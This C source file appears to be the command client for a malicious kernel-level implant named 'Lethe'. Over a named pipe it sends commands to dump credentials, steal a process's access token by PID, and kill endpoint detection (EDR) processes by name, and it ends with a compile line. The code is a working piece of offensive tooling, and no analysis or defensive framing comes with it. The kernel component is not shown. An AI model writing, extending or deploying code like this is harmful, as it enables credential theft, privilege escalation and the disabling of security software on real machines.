#include <windows.h>
#include <stdio.h>

#define PIPE_NAME        "\\\\.\\pipe\\lethe"

#define LETHE_CMD_PING       0x01
#define LETHE_CMD_CREDDUMP   0x02
#define LETHE_CMD_TOKENSTEAL 0x03
#define LETHE_CMD_KILLEDR    0x04

#pragma pack(push, 1)

typedef struct {
    BYTE  Command;
    DWORD PayloadLength;
} LETHE_MSG_HEADER;

typedef struct {
    ULONG TargetPid;
} LETHE_TOKEN_PAYLOAD;

typedef struct {
    WCHAR ProcessName[64];
} LETHE_EDR_PAYLOAD;

#pragma pack(pop)

// Send a command with optional payload
BOOL LetheSend(HANDLE pipe, BYTE cmd, PVOID payload, DWORD payloadLen) {
    LETHE_MSG_HEADER hdr = { 0 };
    hdr.Command       = cmd;
    hdr.PayloadLength = payloadLen;

    DWORD written = 0;

    // Send header
    if (!WriteFile(pipe, &hdr, sizeof(hdr), &written, NULL))
        return FALSE;

    // Send payload if any
    if (payload && payloadLen > 0)
        if (!WriteFile(pipe, payload, payloadLen, &written, NULL))
            return FALSE;

    return TRUE;
}

// Read result from kernel
BOOL LetheRecvResult(HANDLE pipe) {
    // Read length prefix
    DWORD msgLen  = 0;
    DWORD bytesRead = 0;

    if (!ReadFile(pipe, &msgLen, sizeof(DWORD),
                  &bytesRead, NULL))
        return FALSE;

    if (msgLen == 0 || msgLen > 4096) return FALSE;

    // Read message
    char* buf = (char*)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, msgLen + 1);

    if (!buf) return FALSE;

    if (!ReadFile(pipe, buf, msgLen, &bytesRead, NULL)) {
        HeapFree(GetProcessHeap(), 0, buf);
        return FALSE;
    }

    buf[bytesRead] = '\0';
    printf("[Kernel] %s\n", buf);
    HeapFree(GetProcessHeap(), 0, buf);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage:\n");
        printf("  client.exe ping\n");
        printf("  client.exe creddump\n");
        printf("  client.exe tokensteal <pid>\n");
        printf("  client.exe killedr <process.exe>\n");
        return 1;
    }

    HANDLE pipe = CreateNamedPipeA(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1, 65536, 65536, 0, NULL);

    if (pipe == INVALID_HANDLE_VALUE) {
        printf("[!] CreateNamedPipe failed: %d\n", GetLastError());
        return 1;
    }

    printf("[Lethe] Waiting for kernel...\n");
    ConnectNamedPipe(pipe, NULL);
    printf("[Lethe] Connected\n\n");

    if (strcmp(argv[1], "ping") == 0) {
        LetheSend(pipe, LETHE_CMD_PING, NULL, 0);
        LetheRecvResult(pipe);
    }
    else if (strcmp(argv[1], "creddump") == 0) {
        LetheSend(pipe, LETHE_CMD_CREDDUMP, NULL, 0);
        LetheRecvResult(pipe);
    }
    else if (strcmp(argv[1], "tokensteal") == 0 && argc == 3) {
        LETHE_TOKEN_PAYLOAD payload = { 0 };
        payload.TargetPid = (ULONG)atoi(argv[2]);
        LetheSend(pipe, LETHE_CMD_TOKENSTEAL,
                  &payload, sizeof(payload));
        LetheRecvResult(pipe);
    }
    else if (strcmp(argv[1], "killedr") == 0 && argc == 3) {
        LETHE_EDR_PAYLOAD payload = { 0 };
        // Convert argv[2] to wide string
        MultiByteToWideChar(CP_ACP, 0, argv[2], -1,
                            payload.ProcessName, 64);
        LetheSend(pipe, LETHE_CMD_KILLEDR,
                  &payload, sizeof(payload));
        LetheRecvResult(pipe);
    }
    else {
        printf("[!] Unknown command\n");
    }

    CloseHandle(pipe);
    return 0;
}

//compile: cl.exe client.c /Fe:C:\Lethe\build\client.exe /link kernel32.lib